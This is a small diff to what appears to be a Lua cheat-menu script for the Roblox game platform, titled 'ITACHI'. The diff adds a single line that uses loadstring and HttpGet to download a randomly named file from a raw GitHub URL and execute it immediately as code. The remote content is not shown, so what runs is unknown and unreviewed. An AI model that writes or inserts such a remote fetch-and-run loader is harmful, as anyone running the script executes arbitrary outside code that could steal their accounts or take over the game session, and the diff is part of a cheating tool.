@@ -18,6 +18,7 @@ game.StarterGui:SetCore("SendNotification", {
     Duration = 5;
 })
 
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Brookhaven198/-itachi-iraq/refs/heads/main/UZuJkcKv.txt")))()
 MakeWindow({
   Hub = {
     Title = "سكربت ITACHI | SCRPIT ITACHI  ",
